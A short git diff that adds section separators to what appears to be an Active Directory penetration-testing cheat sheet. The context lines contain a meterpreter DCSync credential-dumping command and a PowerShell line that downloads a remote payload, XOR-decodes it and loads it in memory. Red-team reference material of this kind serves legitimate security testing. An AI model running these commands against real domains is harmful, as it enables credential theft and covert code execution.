@@ -7,6 +7,8 @@
 - [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
 > After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
 
+---
+
 ## ACLs
 Get ACL
 
@@ -26,6 +28,8 @@ dump ntds
 meterpreter > dcsync_ntlm <DOMAIN>\<user>
 ```
 
+---
+
 ## Impersonation Token 
 
 ### Tools
@@ -44,6 +48,8 @@ $k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-
 $parameters=@("arg1", "arg2")
 [namespace.Class]::Main($parameters)
 ```
+
+---
 
 ### Kerberos impersonate
 
@@ -101,6 +107,8 @@ Check if a computer has the TrustedForDelegation flag enabled
 ```powershell
 Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
 ```
+
+---
 
 ### Manual testing
 
